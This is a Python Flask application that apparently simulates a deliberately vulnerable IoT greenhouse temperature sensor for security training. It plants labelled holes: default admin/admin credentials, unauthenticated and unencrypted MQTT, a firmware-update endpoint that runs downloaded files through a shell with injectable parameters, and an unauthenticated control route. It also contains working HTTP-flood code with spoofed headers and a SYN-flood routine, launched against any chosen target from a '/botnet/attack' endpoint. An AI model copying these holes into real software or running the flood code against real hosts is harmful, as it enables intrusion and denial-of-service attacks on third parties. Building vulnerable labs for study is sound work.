# app.py
import logging
from flask import Flask, jsonify, request
import paho.mqtt.client as mqtt
import threading
import random
import time
import json
import os
import requests
import subprocess
from werkzeug.utils import secure_filename
from functools import wraps
import socket
import atexit
import requests


app = Flask(__name__)
# Load configuration from environment variables with defaults
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "admin")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin")

# MQTT Configuration
MQTT_BROKER = os.getenv("MQTT_BROKER", "localhost")
MQTT_PORT = int(os.getenv("MQTT_PORT", 1883))
MQTT_TOPIC = os.getenv("MQTT_TOPIC", "sensors/temperature")
MQTT_PUBLISH_INTERVAL = int(os.getenv("MQTT_PUBLISH_INTERVAL", 5))

SENSOR_ID = os.getenv("SENSOR_ID", "TEMP001")
FIRMWARE_VERSION = os.getenv("FIRMWARE_VERSION", "1.0")

# Add these constants after the existing ones
FIRMWARE_PATH = os.getenv("FIRMWARE_PATH", "/tmp/firmware")
UPDATE_SERVER = os.getenv("UPDATE_SERVER", "http://firmware-server.local")
SENSOR_FORMAT = os.getenv("SENSOR_FORMAT", "binary")

# Configure logging
def configure_logging(class_name:str = __name__):
    log = logging.getLogger(class_name)
    log.setLevel(logging.DEBUG)
    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    
    handler = logging.StreamHandler()
    handler.setFormatter(formatter)
    log.addHandler(handler)
    
    return log  # Return the log object

# Call this function to configure logging
log = configure_logging(__name__)  

# Enable debugging mode
app.config['DEBUG'] = True
# ============= INCORPORATE DATA CLIENT DIRECTLY HERE ============= #
class DataServerClient:
    """Client for fetching data from the Data Server with self-registration"""
    
    def __init__(self):
        # Get configuration from environment variables with defaults
        self.server_url = os.getenv("DATA_SERVER_URL", "http://data-server:8000")
        self.sensor_id = os.getenv("SENSOR_ID", "TEMP001")
        self.sensor_type = os.getenv("SENSOR_TYPE", "temperature")
        self.location = os.getenv("SENSOR_LOCATION", "unknown")
        self.environment = os.getenv("SENSOR_ENVIRONMENT", "greenhouse")
        
        self.fetch_interval = int(os.getenv("DATA_FETCH_INTERVAL", 5))  # seconds
        self.heartbeat_interval = int(os.getenv("HEARTBEAT_INTERVAL", 30))  # seconds
        
        self.last_fetched_data = None
        self.fallback_temp = float(os.getenv("FALLBACK_TEMP", "25.0"))
        
        # Initialize connection status
        self.connected = False
        self.connection_failures = 0
        self.max_failures = int(os.getenv("MAX_CONNECTION_FAILURES", 5))
        self.registered = False
        
        log.info(f"Data client initialized for sensor {self.sensor_id}")
        log.info(f"Using Data Server URL: {self.server_url}")
        
        # Start heartbeat in background thread
        self.stop_heartbeat = False
        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop)
        self.heartbeat_thread.daemon = True
        self.heartbeat_thread.start()
    
    def register_with_server(self) -> bool:
        """
        Register this sensor with the data server
        
        Returns:
            bool: True if registration successful, False otherwise
        """
        try:
            registration_url = f"{self.server_url}/sensors/register"
            registration_data = {
                "sensor_id": self.sensor_id,
                "type": self.sensor_type,
                "location": self.location,
                "environment": self.environment,
                "metadata": {
                    "ip": self._get_local_ip(),
                    "version": os.getenv("FIRMWARE_VERSION", "1.0"),
                    "container_id": os.getenv("HOSTNAME", "unknown")
                }
            }
            
            log.info(f"Registering sensor {self.sensor_id} with server")
            response = requests.post(
                registration_url, 
                json=registration_data,
                timeout=10
            )
            
            if response.status_code == 200:
                self.registered = True
                log.info(f"Successfully registered sensor {self.sensor_id}")
                return True
            else:
                log.warning(f"Failed to register sensor: {response.status_code} - {response.text}")
                return False
                
        except Exception as e:
            log.error(f"Error registering sensor: {str(e)}")
            return False
    
    def _heartbeat_loop(self):
        """Background thread to send periodic heartbeats to the server"""
        # Initial registration
        self.register_with_server()
        
        while not self.stop_heartbeat:
            try:
                if not self.registered or self.connection_failures > self.max_failures // 2:
                    # Try to register/re-register if not registered or having connection issues
                    self.register_with_server()
                else:
                    # Send heartbeat
                    heartbeat_url = f"{self.server_url}/sensors/heartbeat/{self.sensor_id}"
                    response = requests.post(
                        heartbeat_url,
                        json={"timestamp": time.time()},
                        timeout=5
                    )
                    
                    if response.status_code == 200:
                        log.debug(f"Heartbeat sent for sensor {self.sensor_id}")
                    else:
                        log.warning(f"Failed to send heartbeat: {response.status_code}")
                        self.registered = False
            except Exception as e:
                log.warning(f"Error in heartbeat: {str(e)}")
                self.registered = False
            
            # Sleep until next heartbeat
            time.sleep(self.heartbeat_interval)
    
    def fetch_temperature(self) -> float:
        """
        Fetch temperature data from the Data Server.
        
        Returns:
            float: Temperature value in celsius
        """
        # Check if it's time to fetch new data
        current_time = time.time()
        if (self.last_fetched_data is None or 
            current_time - self.last_fetched_data.get("fetch_time", 0) >= self.fetch_interval):
            
            try:
                # Construct the URL for this sensor
                url = f"{self.server_url}/environment/{self.sensor_id}"
                log.debug(f"Fetching data from {url}")
                
                # Make the request
                response = requests.get(url, timeout=5)
                
                # Check if successful
                if response.status_code == 200:
                    data = response.json()
                    # Add fetch timestamp
                    data["fetch_time"] = current_time
                    self.last_fetched_data = data
                    self.connected = True
                    self.connection_failures = 0
                    log.debug(f"Successfully fetched data: {data['temperature']} {data['unit']}")
                    
                    # Return the temperature
                    return data["temperature"]
                else:
                    log.warning(f"Failed to fetch data: Status code {response.status_code}")
                    self.connection_failures += 1
                    
            except requests.RequestException as e:
                log.error(f"Error connecting to Data Server: {str(e)}")
                self.connection_failures += 1
                
            # Check if we've exceeded max failures
            if self.connection_failures >= self.max_failures:
                log.warning(f"Exceeded maximum connection failures ({self.max_failures})")
                self.connected = False
                
        # Use last fetched data if available and not too old (within 5x fetch interval)
        if (self.last_fetched_data is not None and 
            current_time - self.last_fetched_data.get("fetch_time", 0) < self.fetch_interval * 5):
            return self.last_fetched_data["temperature"]
            
        # Fall back to default temperature + random variation if we couldn't fetch data
            # Make this fallback more robust
        log.warning("Using fallback temperature generation")
        
        # Use more realistic fallback with time patterns instead of just random
        hour_of_day = time.localtime().tm_hour
        
        # Simulate day/night cycle in fallback
        if 6 <= hour_of_day < 12:  # Morning
            base = self.fallback_temp + 1.0
        elif 12 <= hour_of_day < 18:  # Afternoon
            base = self.fallback_temp + 2.0
        elif 18 <= hour_of_day < 22:  # Evening
            base = self.fallback_temp - 0.5
        else:  # Night
            base = self.fallback_temp - 1.5
            
        return round(base + random.uniform(-0.5, 0.5), 2)
    
    def get_connection_status(self) -> dict:
        """Get the current Data Server connection status"""
        return {
            "connected": self.connected,
            "registered": self.registered,
            "connection_failures": self.connection_failures,
            "last_fetch_time": self.last_fetched_data.get("fetch_time") if self.last_fetched_data else None,
            "server_url": self.server_url
        }
    
    def _get_local_ip(self) -> str:
        """Get local IP address to include in registration"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Doesn't need to be reachable
            s.connect(('10.255.255.255', 1))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return 'unknown'
            
    def cleanup(self):
        """Clean up resources when shutting down"""
        self.stop_heartbeat = True
        if self.heartbeat_thread.is_alive():
            self.heartbeat_thread.join(timeout=1.0)

# Create the singleton instance directly here
data_client = DataServerClient()
# Register cleanup
atexit.register(data_client.cleanup)

# ============= END DATA CLIENT CODE ============= #

# Simulated sensor data
class TemperatureSensor:
    def __init__(self):
        self.base_temperature = 25.0
        self.running = True
        self.fault_mode = "none"  # Possible modes: none, stuck, drift, spike, dropout
        self.last_reading = None
        self.drift_offset = 0.0
        self.calibration_offset = 0.0  # Add calibration offset property
        
        self.data_client = data_client
        
        # Log initialization
        log.info(f"Temperature sensor initialized, connected to Data Server: {self.data_client.server_url}")
        
    def read(self):
        """
        Read the current temperature value from the Data Server.
        Applies any fault modes to simulate sensor health issues.
        """
        # Simulate sensor dropout (fault: no data)
        if self.fault_mode == "dropout":
            return None
        
        # Get the base temperature from Data Server
        base_temperature = self.data_client.fetch_temperature()
        
        # Simulate sensor dropout (fault: no data)
        if self.fault_mode == "dropout":
            return None
        
        # Simulate stuck sensor (fault: always returns same value)
        if self.fault_mode == "stuck":
            if self.last_reading is None:
                reading = round(self.base_temperature + random.uniform(-0.5, 0.5), 2)
                self.last_reading = reading
            return self.last_reading + self.calibration_offset  # Apply calibration offset

        # Simulate drift (fault: gradual increase/decrease)
        if self.fault_mode == "drift":
            self.drift_offset += 0.1  # Gradual drift factor
            reading = round(self.base_temperature + self.drift_offset + random.uniform(-0.5, 0.5), 2)
            self.last_reading = reading
            return reading + self.calibration_offset  # Apply calibration offset

        # Simulate spikes (fault: sudden extreme values)
        if self.fault_mode == "spike":
            normal_reading = self.base_temperature + random.uniform(-0.5, 0.5)
            # With a 50% chance, produce a spike
            if random.random() < 0.5:
                spike_value = normal_reading * 10  # Arbitrary spike multiplier
                self.last_reading = round(spike_value, 2)
                return self.last_reading + self.calibration_offset  # Apply calibration offset
            else:
                self.last_reading = round(normal_reading, 2)
                return self.last_reading + self.calibration_offset  # Apply calibration offset

        # Default: no fault mode, normal reading
        reading = round(base_temperature + random.uniform(-0.5, 0.5), 2)
        self.last_reading = reading
        return reading + self.calibration_offset  # Apply calibration offset
    
class DataFormatter:
    """Formats sensor data in various real-world representation formats"""
    
    @staticmethod
    def format_rich_json(sensor_data):
        """Full metadata-rich JSON format (current implementation)"""
        logging.info("Formatting data to rich JSON")
        return {
            "temperature": sensor_data.value,
            "unit": "celsius",
            "timestamp": time.time(),
            "sensor_id": SENSOR_ID
        }
    
    @staticmethod
    def format_minimal(sensor_data):
        """Just the raw value as string - common in resource-constrained sensors"""
        log.info("Formatting data to minimal format")
        return str(sensor_data.value)
    
    @staticmethod
    def format_csv(sensor_data):
        """Simple CSV format - common in many basic sensors"""
        log.info("Formatting data to CSV format")
        return f"{SENSOR_ID},{sensor_data.value},{int(time.time())}"
    
    @staticmethod
    def format_binary(sensor_data):
        """Binary format - most efficient for transmission"""
        log.info("Formatting data to binary format")
        import struct
        # Pack as: 2-byte sensor ID, 4-byte float temperature, 4-byte timestamp
        sensor_id_int = int(SENSOR_ID.replace('TEMP', ''))
        return struct.pack(">Hfi", sensor_id_int, sensor_data.value, int(time.time()))


class MQTTClient:
    def __init__(self, sensor, data_format=SENSOR_FORMAT):
        self.data_format = data_format
        self.client = mqtt.Client()
        self.sensor = sensor
        
        # No authentication required (vulnerability #2)
        # self.client.username_pw_set("username", "password")
        
        # No TLS (vulnerability #3)
        # self.client.tls_set()
        
    def connect(self):
        try:
            self.client.connect(MQTT_BROKER, MQTT_PORT, 60)
            self.client.loop_start()
        except Exception as e:
            print(f"Failed to connect to MQTT broker: {e}")
            
    def publish_loop(self):
        while self.sensor.running:
            reading = self.sensor.read()
            if reading is None:  # Handle dropout fault mode
                time.sleep(MQTT_PUBLISH_INTERVAL)
                continue
                
            # Create a sensor data object
            data_obj = type('SensorData', (), {'value': reading})
            
            # Format the data according to the selected format
            if self.data_format == "rich_json":
                payload = json.dumps(DataFormatter.format_rich_json(data_obj))
            elif self.data_format == "minimal":
                payload = DataFormatter.format_minimal(data_obj)
            elif self.data_format == "csv":
                payload = DataFormatter.format_csv(data_obj)
            elif self.data_format == "binary":
                payload = DataFormatter.format_binary(data_obj)
            
            try:
                # Publish without encryption (vulnerability)
                self.client.publish(MQTT_TOPIC, payload)
            except Exception as e:
                print(f"Failed to publish: {e}")
                
            time.sleep(MQTT_PUBLISH_INTERVAL)

sensor = TemperatureSensor()
# mqtt_client = MQTTClient(sensor)
mqtt_client = MQTTClient(sensor, data_format=SENSOR_FORMAT)


# Start MQTT publisher in a separate thread
def start_mqtt_publisher():
    mqtt_client.connect()
    mqtt_thread = threading.Thread(target=mqtt_client.publish_loop)
    mqtt_thread.daemon = True
    mqtt_thread.start()

# HTTP Routes
def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ADMIN_USERNAME or auth.password != ADMIN_PASSWORD:
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated


@app.route('/firmware/version', methods=['GET'])
def get_firmware_version():
    """Get current firmware version"""
    log.info("Getting firmware version")
    return jsonify({
        "version": FIRMWARE_VERSION,
        "sensor_id": SENSOR_ID
    })

@app.route('/firmware/update', methods=['POST'])
@require_auth
def update_firmware():
    """
    Update sensor firmware - ENHANCED VULNERABLE ENDPOINT
    
    Vulnerabilities:
    1. Downloads over HTTP (no HTTPS)
    2. No signature verification
    3. No version checking
    4. Command injection through firmware_url
    5. Unsafe string concatenation
    6. Improper input sanitization
    7. Direct execution with enhanced privileges
    
    Expected JSON payload:
    {
        "firmware_url": "http://example.com/firmware.bin",
        "version": "1.1",
        "params": "optional_params"
    }
    """
    data = request.get_json()
    if not data or 'firmware_url' not in data:
        return jsonify({"error": "firmware_url required"}), 400
        
    firmware_url = data['firmware_url']
    firmware_params = data.get('params', '')
    
    try:
        # Vulnerable: Downloads over HTTP, no signature verification
        log.info(f"Downloading firmware from {firmware_url}")
        response = requests.get(firmware_url, stream=True)
        response.raise_for_status()
        
        # Vulnerable: Weak filename sanitization, still allows special characters
        filename = os.path.basename(firmware_url).replace('../', '')
        firmware_path = f"{FIRMWARE_PATH}/{filename}"
        
        # Vulnerable: Directory creation without checking
        os.makedirs(FIRMWARE_PATH, exist_ok=True)
        
        # Read firmware data into memory
        firmware_data = b''
        for chunk in response.iter_content(chunk_size=8192):
            firmware_data += chunk
            
        # Save firmware to disk
        with open(firmware_path, 'wb') as f:
            f.write(firmware_data)
            
        # RESOURCE EXHAUSTION VULNERABILITY
        # Check if the firmware contains a special "compression" marker
        if b'COMPRESS-RATIO:' in firmware_data:
            log.warning("Detected compressed firmware format - extracting...")
            # Extract the compression ratio from the file
            # Format: b'COMPRESS-RATIO:1000\n' where 1000 is the ratio
            import re
            match = re.search(rb'COMPRESS-RATIO:(\d+)\n', firmware_data)
            if match:
                compression_ratio = int(match.group(1))
                log.warning(f"Firmware claims compression ratio of {compression_ratio}:1")
                
                # VULNERABLE: No validation on compression ratio
                # This will cause resource exhaustion through a decompression bomb
                # For example, a 10KB file with a claimed ratio of 1000 would try to expand to 10MB
                try:
                    log.warning("Starting firmware decompression...")
                    
                    # Simulate decompression by creating a large bytearray
                    expanded_size = len(firmware_data) * compression_ratio
                    log.warning(f"Attempting to decompress to {expanded_size} bytes")
                    
                    # RESOURCE EXHAUSTION: This will consume a lot of memory
                    # and potentially crash the application
                    expanded_data = bytearray(expanded_size)
                    
                    # CPU EXHAUSTION: Perform intensive operations on the expanded data
                    log.warning("Performing integrity verification on decompressed data...")
                    for i in range(0, len(expanded_data), 4096):
                        # Simulate CPU-intensive hash verification
                        section = expanded_data[i:i+4096]
                        # Deliberately inefficient operation to consume CPU
                        for j in range(1000):
                            _ = hash(bytes(section))
                            
                    log.warning("Decompression and verification complete")
                except MemoryError:
                    log.error("Memory error during decompression - firmware too large")
                    return jsonify({
                        "status": "error",
                        "message": "Firmware decompression failed due to insufficient memory"
                    }), 500
        
        # Make firmware executable
        os.chmod(firmware_path, 0o755)
        
        # Vulnerable: Unsafe string concatenation with parameters
        # This allows injection of shell commands through the params field
        install_cmd = f"/bin/bash {firmware_path} {firmware_params}"
        
        # Vulnerable: Using shell=True makes command injection easier
        subprocess.run(install_cmd, shell=True, check=True)
        
        # Update version without verification
        global FIRMWARE_VERSION
        FIRMWARE_VERSION = data.get('version', 'unknown')
        
        return jsonify({
            "status": "success",
            "message": "Firmware updated successfully",
            "new_version": FIRMWARE_VERSION,
            "path": firmware_path,
            "command": install_cmd  # Exposing the command for educational purposes
        })
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

# Add a route to simulate firmware corruption
@app.route('/firmware/corrupt', methods=['POST'])
@require_auth
def corrupt_firmware():
    """Simulate firmware corruption (for testing)"""
    try:
        # Vulnerable: Allows simulating corrupted firmware
        global FIRMWARE_VERSION
        FIRMWARE_VERSION = "CORRUPTED_" + FIRMWARE_VERSION
        
        # Simulate system instability
        sensor.base_temperature = random.uniform(-50, 150)
        
        return jsonify({
            "status": "success",
            "message": "Firmware corrupted successfully",
            "version": FIRMWARE_VERSION
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/temperature', methods=['GET'])
def get_temperature():
    """Get current temperature reading - no auth required"""
    return jsonify({
        "temperature": sensor.read(),
        "unit": "celsius",
        "timestamp": time.time(),
        "using_fallback": not data_client.connected  # Add this flag
    })

@app.route('/config', methods=['GET'])
@require_auth
def get_config():
    """Get sensor configuration - requires auth"""
    # Get current raw reading (without calibration) for reference
    raw_reading = sensor.read() - sensor.calibration_offset
    
    return jsonify({
        "sensor_id": SENSOR_ID,
        "type": "temperature",
        "interval": "1s",
        "base_temperature": sensor.base_temperature,
        "mqtt_topic": MQTT_TOPIC,
        "mqtt_interval": MQTT_PUBLISH_INTERVAL,
        "fault_mode": sensor.fault_mode,
        "calibration_offset": sensor.calibration_offset,
        "current_raw_reading": round(raw_reading, 2),
        "current_calibrated_reading": round(raw_reading + sensor.calibration_offset, 2)
    })

@app.route('/config/calibrate', methods=['POST'])
@require_auth
def calibrate():
    """
    Update calibration offset - requires auth
    Expected JSON payload:
    {
        "calibration_offset": 0.5  # Positive or negative correction value
    }
    """
    data = request.get_json()
    if 'calibration_offset' not in data:
        return jsonify({"error": "calibration_offset required"}), 400
    
    # Set the calibration offset
    sensor.calibration_offset = float(data['calibration_offset'])
    
    # Get the actual current reading with and without offset for demonstration
    raw_reading = sensor.read() - sensor.calibration_offset  # Remove offset to get raw value
    calibrated_reading = raw_reading + sensor.calibration_offset  # Add it back to show effect
    
    return jsonify({
        "status": "success", 
        "calibration_offset": sensor.calibration_offset,
        "raw_reading": round(raw_reading, 2),
        "calibrated_reading": round(calibrated_reading, 2)
    })

# Simulate sensor faults/health issues
@app.route('/simulate/fault', methods=['POST'])
@require_auth
def simulate_fault():
    """
    Simulate sensor faults.
    Expected JSON payload:
    {
        "fault_mode": "none" | "stuck" | "drift" | "spike" | "dropout"
    }
    """
    data = request.get_json()
    if not data or "fault_mode" not in data:
        return jsonify({"error": "fault_mode is required. Valid values: none, stuck, drift, spike, dropout"}), 400
    
    fault_mode = data["fault_mode"]
    if fault_mode not in ["none", "stuck", "drift", "spike", "dropout"]:
        return jsonify({"error": "Invalid fault_mode. Use none, stuck, drift, spike, or dropout."}), 400
    
    sensor.fault_mode = fault_mode
    # Reset any state used for fault simulation
    sensor.last_reading = None
    sensor.drift_offset = 0.0
    return jsonify({"status": "success", "fault_mode": sensor.fault_mode})

# New endpoint: get current sensor fault status
@app.route('/simulate/status', methods=['GET'])
def sensor_status():
    return jsonify({
        "fault_mode": sensor.fault_mode,
        "base_temperature": sensor.base_temperature
    })

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint with Data Server connection status"""
    # No need to re-import data_client here
    
    return jsonify({
        "status": "healthy",
        "data_server_connection": data_client.get_connection_status(),
        "mqtt_broker": MQTT_BROKER,
        "mqtt_topic": MQTT_TOPIC,
        "sensor_id": SENSOR_ID,
        "fault_mode": sensor.fault_mode
    }), 200

def perform_attack(target, duration, attack_type):
    """
    Perform a DDoS attack against the specified target.
    
    Args:
        target: The target IP or hostname
        duration: Attack duration in seconds
        attack_type: Type of attack ('http' or 'syn')
    """
    log.warning(f"VULNERABLE FEATURE: Starting {attack_type} attack against {target} for {duration} seconds")
    
    # Track when to stop the attack
    start_time = time.time()
    end_time = start_time + duration
    
    # HTTP flood attack
    if attack_type.lower() == 'http':
        # User agent list for HTTP attacks
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15"
        ]
        
        while time.time() < end_time:
            try:
                # Randomize request parameters
                user_agent = random.choice(user_agents)
                headers = {
                    'User-Agent': user_agent,
                    'Cache-Control': 'no-cache',
                    'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                }
                
                # Generate random URL parameters to bypass caching
                url = f"http://{target}/?{random.randint(1000000, 9999999)}"
                
                # Send the request without waiting for response
                requests.get(url, headers=headers, timeout=1, verify=False)
                
            except Exception:
                # Suppress errors to continue the attack
                pass
    
    # SYN flood attack
    elif attack_type.lower() == 'syn':
        # Use different ports for the attack
        common_ports = [80, 443, 8080, 8443, 22]
        
        while time.time() < end_time:
            try:
                # Create a raw socket
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.settimeout(0.1)  # Very short timeout
                
                # Choose a random port to target
                dest_port = random.choice(common_ports)
                
                # Construct the SYN packet
                packet = IP(dst=target) / TCP(dport=dest_port, flags='S')
                
                # Send the SYN packet
                s.sendto(bytes(packet), (target, dest_port))
                
                # Don't close the socket properly - leave connection half-open
                # Do not close the socket to keep the connection half-open
                
            except Exception:
                # Suppress errors to continue the attack
                pass
    
    log.warning(f"Attack against {target} completed after {duration} seconds")

@app.route('/control', methods=['POST'])
def control_sensor():
    """
    VULNERABLE ENDPOINT: Allows control of sensor settings without proper authorization
    
    This endpoint demonstrates a vulnerability where sensor settings can be modified
    without proper authorization checks.
    
    Expected JSON payload:
    {
        "action": "calibrate"|"update_interval"|"set_crop_data",
        "value": <value based on action>,
        "farm_id": <optional farm identifier>
    }
    """
    # In a secure application, we would verify:
    # 1. If the user is authenticated
    # 2. If the user has permission to control this sensor
    # But we're intentionally omitting these checks
    
    data = request.get_json()
    if not data or "action" not in data or "value" not in data:
        return jsonify({"error": "action and value required"}), 400
    
    action = data["action"]
    value = data["value"]
    farm_id = data.get("farm_id", "unknown")
    
    # Process the requested action
    if action == "calibrate":
        log.warning(f"Calibrating sensor {SENSOR_ID} to {value}°C")
        # Set the calibration offset
        sensor.calibration_offset = float(value)
        
        # Get the actual current reading with and without offset for demonstration
        raw_reading = sensor.read() - sensor.calibration_offset  # Remove offset to get raw value
        calibrated_reading = raw_reading + sensor.calibration_offset  # Add it back to show effect
        
        return jsonify({
            "status": "success", 
            "calibration_offset": sensor.calibration_offset,
            "raw_reading": round(raw_reading, 2),
            "calibrated_reading": round(calibrated_reading, 2)
        })
       
    elif action == "update_interval":
        log.warning(f"Updating interval for sensor {SENSOR_ID} to {value}s")
        global MQTT_PUBLISH_INTERVAL
        MQTT_PUBLISH_INTERVAL = int(value)
        return jsonify({
            "status": "success",
            "message": f"Publish interval for sensor {SENSOR_ID} updated to {value}s",
            "new_interval": MQTT_PUBLISH_INTERVAL
        })
    
    elif action == "set_crop_data":
        # Agricultural-specific action - update crop information
        crop_type = value.get("crop_type", "unknown")
        growth_stage = value.get("growth_stage", "unknown")
        expected_yield = value.get("expected_yield", 0)
        
        log.warning(f"Setting crop data for sensor {SENSOR_ID}: {crop_type} at {growth_stage} stage")
        # In a real application, this would update a database
        
        return jsonify({
            "status": "success",
            "message": f"Crop data for sensor {SENSOR_ID} updated",
            "crop_data": {
                "crop_type": crop_type,
                "growth_stage": growth_stage,
                "expected_yield": expected_yield
            }
        })
    
    else:
        return jsonify({"error": f"Unknown action: {action}"}), 400

# Add this endpoint to your app.py file
@app.route('/botnet/attack', methods=['POST'])
@require_auth
def initiate_attack():
    """VULNERABLE: Allows sensor to participate in DDoS attacks"""
    data = request.get_json()
    if not data or 'target' not in data:
        return jsonify({"error": "target required"}), 400
        
    target = data['target']
    duration = data.get('duration', 10)  # Default 10 seconds
    attack_type = data.get('type', 'http')  # Default HTTP flood
    
    # Start attack in background thread
    thread = threading.Thread(target=perform_attack, args=(target, duration, attack_type))
    thread.daemon = True
    thread.start()
    
    return jsonify({"status": "attack initiated", "target": target})

@app.route('/health/resources', methods=['GET'])
def get_resource_status():
    """Get current resource usage status"""
    try:
        import psutil
    except ImportError:
        return jsonify({
            "error": "psutil not installed, cannot monitor resource usage",
            "install_hint": "Add psutil to your requirements.txt file and rebuild container"
        }), 500
    
    # Get current process
    process = psutil.Process(os.getpid())
    
    # Get CPU usage
    cpu_percent = process.cpu_percent(interval=0.5)
    
    # Get memory usage
    memory_info = process.memory_info()
    memory_mb = memory_info.rss / (1024 * 1024)  # Convert to MB
    
    return jsonify({
        "cpu_percent": cpu_percent,
        "memory_mb": round(memory_mb, 2),
        "active_threads": threading.active_count(),
        "system_memory": {
            "total_mb": round(psutil.virtual_memory().total / (1024 * 1024), 2),
            "available_mb": round(psutil.virtual_memory().available / (1024 * 1024), 2),
            "percent_used": psutil.virtual_memory().percent
        }
    })

if __name__ == '__main__':
    start_mqtt_publisher()
    app.run(host='0.0.0.0', port=12380)